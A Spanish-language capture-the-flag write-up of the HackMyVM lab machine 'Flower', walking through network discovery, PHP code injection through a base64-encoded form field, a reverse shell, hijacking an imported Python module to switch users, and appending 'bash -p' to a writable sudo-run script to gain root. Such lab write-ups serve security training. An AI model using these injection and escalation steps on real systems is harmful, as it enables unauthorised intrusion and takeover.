## Maquina Flower

Hacemos un escaneo de red para ver que ip estan conectadas a nuestra maquina, para ello vamos a utilizar lo siguientes comandos:

````bash
netdiscover -i eth0 y -r ip

**netdiscover:**

- `netdiscover -i eth0`: Este comando ejecuta el escaneo de red en la interfaz de red especificada (`eth0` en este caso). Utiliza ARP (Protocolo de Resolución de Direcciones) para descubrir y mostrar hosts activos en la red local.
- `netdiscover -r IP`: Este comando escanea una red específica especificada por la dirección IP y su máscara de subred (ejemplo: `192.168.1.0/24`). Descubre y muestra los hosts activos en esa red.

arp-scan -I eth0 --localnet

**arp-scan:**

- `arp-scan -I eth0 --localnet`: Este comando ejecuta un escaneo ARP en la interfaz de red especificada (`eth0`) para descubrir hosts en la red local. La opción `--localnet` indica que se escaneará la red local donde está conectada la interfaz especificada.
````

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-26%20175014.png)

Ahora realzimos un ping para corroborar que tenemos conexion con la maquina y seguido lanzamos un nmap con los siguientes comandos:

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-26%20175040.png)

````bash
nmap -p- --open -A -T "ip"

- `nmap`: Este es el comando principal de Nmap.
    
- `-p-`: Este parámetro indica a Nmap que escanee todos los puertos posibles en el rango de 1 a 65535. El guion ("-") es una abreviatura para todos los puertos.
    
- `--open`: Este parámetro le dice a Nmap que solo muestre los puertos que están abiertos.
    
- `-A`: Este parámetro habilita la detección de sistemas operativos, versiones de servicios y scripts de detección de versiones de servicios.
    
- `-T`: Este parámetro define el tiempo de escaneo y se refiere a la velocidad del escaneo. El valor "ip" en tu comando no es un valor válido para este parámetro. Se supone que aquí debes proporcionar uno de los valores predefinidos que establecen la velocidad del escaneo, como "paranoid", "sneaky", "polite", "aggressive", "insane", entre otros.
````

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-26%20175617.png)

Solo tenemos el puerto 80 abierto, esto es un servidor web http, asi que vamos a ingresar al sitio.

Como vemos el sitio nos permite elejir flores y nos detalla cuantos petalos tiene cada flor.

Por motivo de que la pagina no nos brindo ningun tipo de directorios ocultos y demas, vamos a ingresar a burpsuite para ver como se esta menjando la pagina por dentro.

Lo que notamos es que cambiando por la cantidad de petalos de las flores por una palabra random esta nos detalla por el sitio unas letras e iconos

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-26%20182139.png)
![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-26%20182224.png)
![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-26%20182338.png)

Hay que tener en cuenta que en el codigo fuente hay una especia de codificacion ejemplo: OCsxMw== asi que vamosa  decencodear para ver el contenido, en este caso esta en base64.
Y al aparecer esto nos da la suma de los petalos (2+3).

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-26%20182250.png)

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-26%20183204.png)

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-26%20182403.png)

Bien ahora queda en realizar un busqueda sobre si podemos ingresar codigo malisioso para leer tanto archivos de sistema como tambien tener una revershell, para eso busque en chato gpt.

````bash
Sí, es posible ejecutar comandos en el sistema inyectando código PHP malicioso en una aplicación web si la aplicación no está correctamente protegida contra la inyección de código. Esto es especialmente cierto si la aplicación web ejecuta el código PHP del usuario sin una adecuada validación o filtrado.

Por ejemplo, si tienes un formulario web que toma una entrada de usuario y la ejecuta como código PHP en el servidor sin ningún tipo de filtrado, un atacante podría inyectar código malicioso de la siguiente manera:

Supongamos que hay un formulario que toma un nombre de usuario y lo utiliza para mostrar un mensaje de bienvenida en una página PHP:

`<?php // Recuperar el nombre de usuario proporcionado por el usuario $username = $_POST['username'];  
// Mostrar un mensaje de bienvenida usando el nombre de usuario echo "Bienvenido, $username!"; ?>`

Si el usuario envía el siguiente nombre de usuario a través del formulario:

`'; echo system('ls'); echo '` 

El código PHP resultante se verá así:

`<?php // Recuperar el nombre de usuario proporcionado por el usuario $username = ''; echo system('ls'); echo ' ';  // Mostrar un mensaje de bienvenida usando el nombre de usuario echo "Bienvenido, $username!"; ?>`

El resultado de esto sería que el comando `ls` (que muestra el contenido del directorio) se ejecutaría en el servidor y su salida se mostraría en la página web. Esto puede dar al atacante acceso a información confidencial o incluso permitir la ejecución de comandos maliciosos en el servidor.
````

Ahora como se ve que es posible inyectar codigo PHP vamos a utlizar el siguiente comando para ver si podemos leer algun archivo en el sistema, claro que hay que codificar el comando:

````bash
echo system('whoami')
````
![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-26%20185747.png)

Una vez encodeado lo mandamos collocamos en el apartado "petals", suplantando la el "nombre de las flores":
Ahora como resultado tenes al usuarios "www-data"

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-26%20185655.png)

Lanzamos otro comando para estar seguro:

````bash
echo system('ls')
````

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-26%20190053.png)

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-26%20190027.png)

Listo, ahora vamos a realizar un revershell encodeando el comando y a su vez nos ponemos en escucha en otra terminal con netcat:

A la revershell hay que colocarla dentro del "echo system ("revershell")" para que funcione

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-26%20190551.png)
![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-26%20190645.png)
![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-26%20190630.png)

Seguido una vez que obtuvimos la revershell y somos el usuarios www-data nos queda escalar priveligios.

Hacemos el tratamiento de la tty para tener un shell estable, en este caso lo hacemos con pythom ya que esta instalado.

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-26%20190726.png)

````bash
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo;fg
export TERM=screen
````

Bien ahora vemos que tenemos un usuariop llamado rose

Dentro de este tiene una carpeta con nombre diary.

En esta carpeta contiene un archivo python llamado diary.py, que este archivo ejecunta un script llamado pickle.py:

````bash
que haces esto :
import pickle diary = {"November28":"i found a blue viola","December1":"i lost my blue viola"} p = open('diary.pickle','wb') pickle.dump(diary,p)

El código que proporcionas realiza las siguientes acciones:

1. Importa el módulo `pickle`. `pickle` es un módulo de serialización en Python que permite convertir objetos Python en una secuencia de bytes y viceversa, lo que facilita su almacenamiento en archivos o su transmisión a través de la red.
    
2. Crea un diccionario llamado `diary`, que contiene algunas entradas de diario, donde las claves son fechas (en formato de cadena) y los valores son las entradas del diario (también en formato de cadena).
    
3. Abre un archivo llamado `'diary.pickle'` en modo de escritura binaria (`'wb'`). Este archivo se utilizará para almacenar el diccionario serializado usando el módulo `pickle`.
    
4. Utiliza `pickle.dump()` para serializar el diccionario `diary` y escribirlo en el archivo `'diary.pickle'`. La función `pickle.dump()` toma dos argumentos: el objeto que se va a serializar y el archivo (o un objeto de archivo) donde se escribirán los datos serializados.
5. 
6. Entonces, en resumen, este código crea un archivo llamado `'diary.pickle'` que contiene una versión serializada del diccionario `diary`. Este archivo `'diary.pickle'` puede luego ser leído y deserializado para recuperar el diccionario original utilizando la función `pickle.load()`.
````

Entonces creamos un script llamado pickle.py con el siguiente comando:

````bash
import os
os.system('/bin/bash')
````
![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-26%20192428.png)

Seguido ejecutamos lo siguiente

sudo -u rose /usr/bin/python3 /home/rose/diary/diary.py

Logrando ser el usuario rose, ahora nos queda llegar a tener el maximo privilegios. Para ello hacemos un "sudo -l" para ver si hay binarios sudo.

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-28%20190634.png)

El archivo .plantbook es un script de bash ejecutable con el siguiente contenido.

Comprobando los permisos de rose sobre ese archivo se observa que tiene permisos de escritura, por lo que para la escalada a root simplemente se modifica el archivo incluyendo al final la ejecución de una bash privilegiada.

Cambiamos el contenido de .plantbook con el siguiente comando:

````bash
echo bash -p >> .plantbook
sudo -u root /bin/bash /home/rose/.plantbook
````

![](https://github.com/Qu0kk4/Quokk4/blob/main/HackMyVm/image/Captura%20de%20pantalla%202024-03-26%20193130.png)
